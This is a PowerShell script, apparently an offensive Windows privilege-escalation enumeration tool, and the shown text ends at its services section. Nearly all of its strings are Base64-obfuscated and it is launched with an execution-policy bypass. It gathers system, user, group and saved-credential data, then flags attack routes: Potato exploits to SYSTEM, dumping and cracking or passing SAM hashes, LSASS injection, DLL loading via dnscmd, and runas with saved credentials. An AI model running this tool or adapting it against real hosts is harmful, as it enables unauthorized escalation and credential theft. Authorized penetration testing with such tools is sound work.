# ============================================================================
#  ######  ######  #### #     # #     #
#  #     # #     #  #   #     #  #   #
#  #     # #     #  #   #     #   # #
#  ######  ######   #   #     #    #
#  #       #   #    #    #   #     #
#  #       #    #   #     # #      #
#  #       #     # ####    #       #
# ============================================================================
#  Windows Privilege Escalation Enumeration Tool
#  Author : Pentest-Ready
#  Version: 1.2
#  Usage  : powershell -ep bypass -File privy.ps1
# ============================================================================

$ErrorActionPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2lsZW50bHlDb250aW51ZQ==')))

# --------------------------------------------------
#  Output directory structure
# --------------------------------------------------
$main     = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJpdnk=')))
$sys      = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XFN5c0luZm8udHh0'))))
$ugo      = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XFVzZXJHcm91cEluZm8udHh0'))))
$svc      = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XFNlcnZpY2VzLnR4dA=='))))
$tasks    = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XFNjaGVkdWxlZFRhc2tzLnR4dA=='))))
$reg      = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XFJlZ2lzdHJ5LnR4dA=='))))
$netstuff = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XE5ldHdvcmtJbmZvLnR4dA=='))))
$creds    = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XENyZWRlbnRpYWxzLnR4dA=='))))
$sw_out   = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XFNvZnR3YXJlLnR4dA=='))))
$fs       = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XEZpbGVTeXN0ZW0udHh0'))))
$history  = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XEhpc3Rvcmllcy50eHQ='))))
$devtools = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XERldlRvb2xzLnR4dA=='))))
$findings = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XDAwLUZJTkRJTkdTLnR4dA=='))))
$exploit  = ($main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XDAxLUV4cGxvaXRQYXRocy50eHQ='))))

# --------------------------------------------------
#  Helper functions
# --------------------------------------------------
function Banner {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4gID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIyMjIyMjICAjIyMjIyMgICMjIyMgIyAgICAgIyAjICAgICAj'))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIyAgICAgIyAjICAgICAjICAjICAgIyAgICAgIyAgIyAgICM='))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIyAgICAgIyAjICAgICAjICAjICAgIyAgICAgIyAgICMgIw=='))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIyMjIyMjICAjIyMjIyMgICAjICAgIyAgICAgIyAgICAj'))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIyAgICAgICAjICAgIyAgICAjICAgICMgICAjICAgICAj'))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIyAgICAgICAjICAgICMgICAjICAgICAjICMgICAgICAj'))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIyAgICAgICAjICAgICAjICMjIyMgICAgIyAgICAgICAj'))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09'))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgV2luZG93cyBQcml2aWxlZ2UgRXNjYWxhdGlvbiBFbnVtZXJhdGlvbiBUb29sIHYxLjI='))) -ForegroundColor Yellow
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09YG4='))) -ForegroundColor Cyan
}

function Section-Header {
    param($Label, $OutFile)
    Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIA=='))) + $Label) -ForegroundColor Green
    Add-Content $OutFile ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09')))
    Add-Content $OutFile (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIA=='))) + $Label)
    Add-Content $OutFile ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PWBu')))
}

function Sub-Header {
    param($Label, $OutFile)
    Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgID4g'))) + $Label) -ForegroundColor Yellow
    Add-Content $OutFile ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ==')))
    Add-Content $OutFile (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICA+IA=='))) + $Label)
    Add-Content $OutFile ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ==')))
}

function Run-Cmd {
    param($Label, [ScriptBlock]$Cmd, $OutFile)
    Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIA=='))) + $Label) -ForegroundColor Cyan
    Add-Content $OutFile (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBb'))) + $Label + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XQ=='))))
    $cmdText = ($Cmd.ToString().Trim() -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XHMr'))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IA=='))))
    Add-Content $OutFile (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICA+IA=='))) + $cmdText)
    Add-Content $OutFile ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tLS0tLS0=')))
    try {
        $result = & $Cmd 2>$null | Out-String
        Add-Content $OutFile $result
    } catch {
        Add-Content $OutFile ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAoZXJyb3Igb3Igbm90IGF2YWlsYWJsZSk=')))
    }
    Add-Content $OutFile ''
}

function Finding {
    param($Msg, $OutFile)
    Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFshIV0g'))) + $Msg) -ForegroundColor Red
    Add-Content $OutFile (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4gIFshIV0gRklORElORzog'))) + $Msg + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4='))))
    Add-Content $findings (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WyEhXSA='))) + $Msg + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAoc2VlIA=='))) + $([System.IO.Path]::GetFileName($OutFile) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KSk='))))
}

function Exploit-Entry {
    param($Priority, $Vector, $Steps)
    switch ($Priority) {
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDE='))) { Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFtQMV0g'))) + $Vector) -ForegroundColor Red }
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDI='))) { Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFtQMl0g'))) + $Vector) -ForegroundColor Yellow }
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDM='))) { Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFtQM10g'))) + $Vector) -ForegroundColor Cyan }
    }
    Add-Content $exploit ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ==')))
    Add-Content $exploit (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ww=='))) + $Priority + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XSA='))) + $Vector)
    Add-Content $exploit ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ==')))
    Add-Content $exploit $Steps
    Add-Content $exploit ''
}

function Separator {
    param($OutFile)
    Add-Content $OutFile ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09YG4=')))
}

# --------------------------------------------------
#  Initialise
# --------------------------------------------------
Banner

if (Test-Path $main) {
    $bak = (${main} + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('X2Jha18='))) + $(Get-Date -Format 'yyyyMMddHHmmss'))
    Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WyFdIERpcmVjdG9yeSAn'))) + $main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JyBleGlzdHMuIEJhY2tpbmcgdXAgdG8g'))) + $bak + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Li4u')))) -ForegroundColor Yellow
    Rename-Item $main $bak
}

New-Item -ItemType Directory -Path $main | Out-Null

# Init findings
@"
======================================================================
  PRIVY -- FINDINGS SUMMARY
  Generated: $(Get-Date)
  Host: $env:COMPUTERNAME
  User: $env:USERNAME
======================================================================

"@ | Out-File $findings -Encoding UTF8

Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIE91dHB1dCBkaXJlY3Rvcnk6IA=='))) + $(Get-Location) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XA=='))) + $main) -ForegroundColor Green
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIFNjYW4gc3RhcnRlZDog'))) + $(Get-Date) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

$startTime = Get-Date

# ============================================================================
#  1. SYSTEM INFORMATION
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSAxIDogU1lTVEVNIElORk9STUFUSU9O'))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIFN5c3RlbSBJbmZvYG4='))) + $(Get-Date) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) | Out-File $sys -Encoding UTF8

Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtIEluZm9ybWF0aW9u'))) $sys

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T1MgJiBLZXJuZWw='))) $sys
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('c3lzdGVtaW5mbw=='))) { systeminfo } $sys
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T1MgVmVyc2lvbg=='))) { (Get-WmiObject Win32_OperatingSystem).Caption + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IEJ1aWxkIA=='))) + (Get-WmiObject Win32_OperatingSystem).BuildNumber } $sys
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXJjaGl0ZWN0dXJl'))) { (Get-WmiObject Win32_OperatingSystem).OSArchitecture } $sys

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SG9zdG5hbWUgJiBEb21haW4='))) $sys
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aG9zdG5hbWU='))) { hostname } $sys
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RG9tYWlu'))) { (Get-WmiObject Win32_ComputerSystem).Domain } $sys
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aXBjb25maWc='))) { ipconfig /all } $sys

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RW52aXJvbm1lbnQgVmFyaWFibGVz'))) $sys
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZW52'))) { Get-ChildItem Env: | Format-Table -AutoSize } $sys

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG93ZXJTaGVsbCBMYW5ndWFnZSBNb2Rl'))) $sys
$psLangMode = $ExecutionContext.SessionState.LanguageMode
Add-Content $sys (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBMYW5ndWFnZU1vZGU6IA=='))) + $psLangMode)
Add-Content $sys (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQU1ZlcnNpb246IA=='))) + $($PSVersionTable.PSVersion))
if ($psLangMode -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q29uc3RyYWluZWRMYW5ndWFnZQ==')))) {
    Finding ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG93ZXJTaGVsbCBpcyBpbiBDb25zdHJhaW5lZExhbmd1YWdlIG1vZGUgLS0gbWFueSAuTkVUIG1ldGhvZHMvY21kbGV0cyBhcmUgcmVzdHJpY3RlZA=='))) $sys
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SG90Zml4ZXMgLyBQYXRjaGVz'))) $sys
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW5zdGFsbGVkIEhvdGZpeGVz'))) { Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 30 | Format-Table -AutoSize } $sys

Separator $sys
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $sys + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  2. USER & GROUP INFORMATION
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSAyIDogVVNFUiAmIEdST1VQIElORk9STUFUSU9O'))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $ugo -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VXNlciAmIEdyb3VwIEluZm9ybWF0aW9u'))) $ugo

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q3VycmVudCBVc2VyIENvbnRleHQ='))) $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2hvYW1p'))) { whoami } $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2hvYW1pIC9hbGw='))) { whoami /all } $ugo

# Capture privileges for later
$whoamiPriv = whoami /priv 2>$null | Out-String

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJpdmlsZWdlIEFuYWx5c2lz'))) $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2hvYW1pIC9wcml2'))) { whoami /priv } $ugo

$dangerousPrivs = @{
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VJbXBlcnNvbmF0ZVByaXZpbGVnZQ==')))  = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG90YXRvIGV4cGxvaXQgKFByaW50U3Bvb2ZlciAvIEdvZFBvdGF0byAvIEp1aWN5UG90YXRvKSAtPiBTWVNURU0=')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VBc3NpZ25QcmltYXJ5VG9rZW4=')))    = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG90YXRvIGV4cGxvaXQgLT4gU1lTVEVN')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VCYWNrdXBQcml2aWxlZ2U=')))       = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q29weSBTQU0vU1lTVEVNIGhpdmVzIC0+IGR1bXAgaGFzaGVzIC0+IGNyYWNrIG9yIFBUSA==')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VSZXN0b3JlUHJpdmlsZWdl')))      = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T3ZlcndyaXRlIHN5c3RlbSBmaWxlcyAvIERMTCBoaWphY2s=')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VUYWtlT3duZXJzaGlwUHJpdmlsZWdl')))= ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VGFrZSBvd25lcnNoaXAgb2Ygc2Vuc2l0aXZlIGZpbGVzIChTQU0sIFNZU1RFTSwgc2VydmljZSBiaW5hcmllcyk=')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VEZWJ1Z1ByaXZpbGVnZQ==')))        = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW5qZWN0IGludG8gTFNBU1Mgb3IgU1lTVEVNIHByb2Nlc3NlcyAtPiBkdW1wIGNyZWRzIC8gY29kZSBleGVj')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VMb2FkRHJpdmVyUHJpdmlsZWdl')))   = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9hZCBhIG1hbGljaW91cyBkcml2ZXIgLT4ga2VybmVsLWxldmVsIGNvZGUgZXhlY3V0aW9u')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VDcmVhdGVUb2tlblByaXZpbGVnZQ==')))  = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q3JlYXRlIHRva2VucyB3aXRoIGFyYml0cmFyeSBwcml2aWxlZ2VzIC0+IFNZU1RFTQ==')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VUY2JQcml2aWxlZ2U=')))          = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWN0IGFzIE9TIC0gY3JlYXRlIHRva2VucywgbG9nIG9uIGFzIGFueSB1c2Vy')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VNYW5hZ2VWb2x1bWVQcml2aWxlZ2U='))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGUgdG8gYXJiaXRyYXJ5IGRpc2sgc2VjdG9ycyAtPiBvdmVyd3JpdGUgZmlsZXM=')))
}

foreach ($priv in $dangerousPrivs.Keys) {
    if ($whoamiPriv -match $priv) {
        if ($whoamiPriv -match ($priv + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XHMrXFMrXHMrRW5hYmxlZA=='))))) {
            Finding ($priv + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IGlzIEVOQUJMRUQgLS0g'))) + $($dangerousPrivs[$priv])) $ugo
        } else {
            Finding ($priv + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IHByZXNlbnQgKGRpc2FibGVkKSAtLSBtYXkgYmUgZW5hYmxlYWJsZTog'))) + $($dangerousPrivs[$priv])) $ugo
        }
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SGlnaC1Qcml2aWxlZ2UgR3JvdXAgTWVtYmVyc2hpcA=='))) $ugo
$whoamiGroups = whoami /groups 2>$null | Out-String
$privGroups = @{
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QmFja3VwIE9wZXJhdG9ycw==')))        = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVhZCBTQU0vU1lTVEVNIGhpdmVzIHZpYSByZWcgc2F2ZSAoU2VCYWNrdXBQcml2aWxlZ2Up')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VydmVyIE9wZXJhdG9ycw==')))        = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TW9kaWZ5IHNlcnZpY2VzIC0+IFNZU1RFTQ==')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJpbnQgT3BlcmF0b3Jz')))         = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9hZCBkcml2ZXJzLCBtYW5hZ2UgUHJpbnQgU3Bvb2xlcg==')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SHlwZXItViBBZG1pbmlzdHJhdG9ycw==')))  = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SHlwZXItViBlc2NhcGUgcGF0aHMgcG9zc2libGU=')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWNjb3VudCBPcGVyYXRvcnM=')))       = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TW9kaWZ5IG5vbi1hZG1pbiB1c2VyIGFjY291bnRz')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RG5zQWRtaW5z')))               = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9hZCBETEwgdmlhIGRuc2NtZCAvY29uZmlnIC9zZXJ2ZXJsZXZlbHBsdWdpbmRsbCAtPiBTWVNURU0gb24gREM=')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2NoZW1hIEFkbWlucw==')))           = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TW9kaWZ5IEFEIHNjaGVtYSAoZm9yZXN0LXdpZGUp')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RW50ZXJwcmlzZSBBZG1pbnM=')))       = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Rm9yZXN0LXdpZGUgYWRtaW4gKGVmZmVjdGl2ZWx5IERBKyk=')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RG9tYWluIEFkbWlucw==')))           = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RnVsbCBkb21haW4gY29udHJvbA==')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R3JvdXAgUG9saWN5IENyZWF0b3IgT3duZXJz'))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q3JlYXRlL21vZGlmeSBHUE9zIC0+IGRvbWFpbi13aWRlIGNvZGUgZXhlY3V0aW9u')))
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJvdGVjdGVkIFVzZXJz')))         = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KGRlZmVuc2l2ZSkgY3JlZCB0aGVmdCBtaXRpZ2F0aW9ucyBlbmFibGVkIGZvciB0aGlzIHVzZXI=')))
}
$privGroupHits = @()
foreach ($g in $privGroups.Keys) {
    if ($whoamiGroups -match [regex]::Escape($g)) {
        $privGroupHits += $g
        if ($g -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJvdGVjdGVkIFVzZXJz')))) {
            Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWVtYmVyIG9mIGhpZ2gtcHJpdmlsZWdlIGdyb3VwOiA='))) + $g + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0tIA=='))) + $($privGroups[$g])) $ugo
        } else {
            Add-Content $ugo ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbaW5mb10gVXNlciBpcyBpbiAnUHJvdGVjdGVkIFVzZXJzJyAtLSBMU0FTUyBjcmVkIHRoZWZ0IGlzIGhhcmRlcg==')))
        }
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9jYWwgVXNlcnM='))) $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0IHVzZXI='))) { net user } $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9jYWwgdXNlciBkZXRhaWxz'))) { Get-LocalUser | Format-Table Name,Enabled,LastLogon,PasswordRequired -AutoSize } $ugo

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9jYWwgR3JvdXBz'))) $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0IGxvY2FsZ3JvdXA='))) { net localgroup } $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWRtaW5pc3RyYXRvcnMgZ3JvdXA='))) { net localgroup Administrators } $ugo

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nZ2VkLU9uIFVzZXJz'))) $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cXVlcnkgdXNlcg=='))) { query user } $ugo

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGFzc3dvcmQgUG9saWN5'))) $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0IGFjY291bnRz'))) { net accounts } $ugo

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2F2ZWQgQ3JlZGVudGlhbHM='))) $ugo
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y21ka2V5IC9saXN0'))) { cmdkey /list } $ugo
$cmdkeyResult = cmdkey /list 2>$null | Out-String
if ($cmdkeyResult -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VGFyZ2V0Og==')))) {
    Finding ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2F2ZWQgY3JlZGVudGlhbHMgZm91bmQgaW4gY21ka2V5IC0tIHRyeTogcnVuYXMgL3NhdmVjcmVkIC91c2VyOjx1c2VyPiBjbWQ='))) $ugo
}

Separator $ugo
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $ugo + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  3. SERVICES
# ============================================================================
